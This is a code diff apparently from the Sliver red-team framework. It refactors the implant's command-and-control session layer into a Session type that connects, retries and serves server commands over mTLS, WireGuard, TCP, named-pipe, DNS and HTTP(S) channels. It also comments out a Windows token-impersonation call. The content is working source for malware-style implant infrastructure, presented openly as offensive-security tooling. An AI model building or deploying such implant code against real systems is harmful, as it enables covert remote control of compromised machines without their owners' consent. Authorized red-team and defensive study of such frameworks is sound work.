@@ -20,27 +20,27 @@ package c2
 
 import (
 	"fmt"
+	"sync"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"google.golang.org/protobuf/proto"
-	"google.golang.org/protobuf/reflect/protoreflect"
-
 	// {{if eq .Config.GOOS "windows"}}
 	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
-
+	// "github.com/bishopfox/sliver/implant/sliver/syscalls"
 	// {{end}}
 
 	// {{if .Config.DNSc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
-
 	// {{end}}
 
 	// {{if .Config.HTTPc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
+	// {{end}}
+
+	// {{if .Config.CommEnabled}}
+	"github.com/bishopfox/sliver/implant/sliver/comm"
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
@@ -52,50 +52,106 @@ var (
 	readBufSize = 16 * 1024 // 16kb
 )
 
-// StartSession - Setup a Session RPC either around a provided, physical connection,
-// or directly through C2 channel packages that take care of this.
-func (t *C2) StartSession() (err error) {
+// Session - A Session is the first, most simple C2 type embedding the base Transport object.
+// The role of this type is primarily to transform a connection (physical,logical or even none)
+// into a session (as its name implies). This is why some C2 protocols like HTTP or DNS do not
+// use the Transport.Conn, because these protocols are themselves session-based, regardless of
+// them being used in a offensive security context.
+// The session implements the missing methods to satisfy the Channel interface.
+type Session struct {
+	*transports.Driver // Base
+	*sync.RWMutex      // Concurrency management
+
+	// {{if .Config.CommEnabled}}
+	// Comm - Each transport over which a Session Connection (above) is working also
+	// has a Comm system object, that is referenced here so that when the transport
+	// is cut/switched/close, we can close the Comm subsystem and its connections.
+	// This will not be started/used when the C2 type is Beacon.
+	Comm *comm.Comm
+	// {{end}}
+}
+
+// NewSession - Instantiate a new Session type, for interactive use of the implant.
+func NewSession(t *transports.Driver) (s *Session) {
+	s = &Session{
+		Driver:  t,
+		RWMutex: &sync.RWMutex{},
+	}
+	return
+}
+
+// Start - Start an implant Session, ready to register to the server.
+func (s *Session) Start() (err error) {
+	// {{if .Config.Debug}}
+	log.Printf("Running in Session mode (Transport ID: %s)", s.ID)
+	// {{end}}
+
+	// Start the driver first, so that any transport-level
+	// protocol connections are started if one is needed.
+	// Also reinitialize some state such as attempts/failures,
+	// and register some more specialized parallel connections/listeners
+	// for Channels like WireGuard: they also use Connection.Cleanup
+	s.Conn, err = s.Driver.Connect()
+	if err != nil {
+		return fmt.Errorf("Driver failed to connect: %s", err)
+	}
+
+	// We're now ready to start the Session per-se, which can be ranging from
+	// simply wrapping an underlying net.Conn with a TLV ReadWriter on top, or
+	// implement a complete session in the original technical meaning, when the
+	// C2 Channel is based on HTTP or DNS.
+	err = s.StartSession()
+
+	return
+}
+
+// StartSession - Either setup a TLV ReadWriter around a provided connection,
+// or after having instantiated a complete C2 Channel session implementation.
+func (s *Session) StartSession() (err error) {
 
 	// Maybe move this out of here
-	for t.attempts < int(t.Profile.MaxConnectionErrors) {
+	for {
+		// Return an error if we have exhausted our allowed maximum errors.
+		if _, failures := s.Statistics(); failures == int(s.MaxConnectionErrors) {
+			return ErrMaxAttempts
+		}
 
-		// Always reinstantiate a blank but ready to work Connection
-		t.Connection = transports.NewConnection()
-
-		switch t.uri.Scheme {
+		switch s.C2 {
 
 		// Some protocols can count on a physical connection already being here.
 		// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled .Config.TCPc2Enabled .Config.NamePipec2Enabled}}
-		case "mtls", "wg", "tcp", "namedpipe", "pipe":
-			if t.Conn == nil {
+		case sliverpb.C2_TCP, sliverpb.C2_MTLS, sliverpb.C2_WG, sliverpb.C2_NamedPipe:
+			if s.Conn == nil {
 				return fmt.Errorf("Failed to create Connection: no physical connection in transport")
 			}
-			err = transports.NewSession(t.Conn, t.Connection)
+			err = transports.NewSession(s.Conn, s.Connection)
 			// {{end}}
 
 		// {{if .Config.DNSc2Enabled}}
-		case "dns":
-			err = dnsclient.NewSessionDNS(t.uri, t.Profile, t.Connection)
+		case sliverpb.C2_DNS:
+			err = dnsclient.NewSessionDNS(s.URI, s.Profile(), s.Connection)
 			// {{end}}
 
 		// {{if .Config.HTTPc2Enabled}}
-		case "https":
-			err = httpclient.NewSessionHTTPS(t.uri, t.Profile, t.Connection)
+		case sliverpb.C2_HTTP:
+			err = httpclient.NewSessionHTTP(s.URI, s.Profile(), s.Connection)
 
-		case "http":
-			err = httpclient.NewSessionHTTP(t.uri, t.Profile, t.Connection)
+		case sliverpb.C2_HTTPS:
+			err = httpclient.NewSessionHTTPS(s.URI, s.Profile(), s.Connection)
 			// {{end}}
 
 		default:
-			return fmt.Errorf("Invalid C2 address sheme: %s", t.uri.Scheme)
+			// At this level of the Channel stack, we must never get out from here.
+			return fmt.Errorf("Invalid C2 address sheme: %s", s.URI.Scheme)
 		}
 
-		// Wait and retry if any error was thrown when starting/setting up the session layer
+		// Wait and retry if any error was thrown
+		// when starting/setting up the session layer
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[%s] Connection failed: %s", t.Profile.C2.String(), err)
+			log.Printf("[%s] Connection failed: %s", s.C2.String(), err)
 			// {{end}}
-			t.WaitOnFailure()
+			s.WaitOnFailure()
 			continue
 		}
 
@@ -106,12 +162,12 @@ func (t *C2) StartSession() (err error) {
 	return
 }
 
-// ServeSessionHandlers - Watch for and process envelopes being sent by the server.
-// These envelopes are quite similarly asynchronous to beacon tasks, but they
-// are NOT the same thing: this is somehow lower-level.
-func (t *C2) ServeSessionHandlers() {
+// Serve - Block and serve the session handlers. The error channel
+// is passed by the caller so that he can monitor for error-caused
+// closures of this transport, for automatic fallback purposes.
+func (s *Session) Serve(errs chan error) {
 
-	connection := t.Connection
+	connection := s.Connection
 
 	// Reconnect active pivots
 	// pivots.ReconnectActivePivots(connection)
@@ -143,12 +199,12 @@ func (t *C2) ServeSessionHandlers() {
 
 			// {{if eq .Config.GOOS "windows" }}
 			if priv.CurrentToken != 0 {
-				err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
-				if err != nil {
-					// {{if .Config.Debug}}
-					log.Printf("Error: %v\n", err)
-					// {{end}}
-				}
+				// err := syscalls.ImpersonateLoggedOnUser(priv.CurrentToken)
+				// if err != nil {
+				//         // {{if .Config.Debug}}
+				//         log.Printf("Error: %v\n", err)
+				//         // {{end}}
+				// }
 			}
 			// {{end}}
 
@@ -209,17 +265,39 @@ func (t *C2) ServeSessionHandlers() {
 	}
 }
 
-// Envelope - Creates an envelope with the given type and data.
-func Envelope(msgType uint32, message protoreflect.ProtoMessage) *sliverpb.Envelope {
-	data, err := proto.Marshal(message)
+// Send - Send a message to the server without any prior request.
+// The underlying ReadWriter ensures no cleanup/shutdown is performed
+// before being able to try to write the data to the connection/channel.
+func (s *Session) Send(req *sliverpb.Envelope) {
+	s.Connection.RequestSend(req)
+}
+
+// Close - Close the session and all its underlying components.
+func (s *Session) Close() (err error) {
+	// {{if .Config.Debug}}
+	log.Printf("Closing Session %s (CC: %s)", s.ID, s.URI.String())
+	// {{end}}
+
+	// {{if .Config.CommEnabled}}
+	if !s.CommDisabled && s.Comm != nil {
+		err = s.Comm.Close()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("Comm Switch error: " + err.Error())
+			// {{end}}
+		}
+	}
+	// {{end}}
+
+	err = s.Connection.Close()
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("Failed to encode register msg %s", err)
+		log.Printf("Error closing Session connection: %s", err)
 		// {{end}}
-		return nil
 	}
-	return &sliverpb.Envelope{
-		Type: msgType,
-		Data: data,
-	}
+
+	// {{if .Config.Debug}}
+	log.Printf("Transport closed (%s)", s.URI.String())
+	// {{end}}
+	return
 }
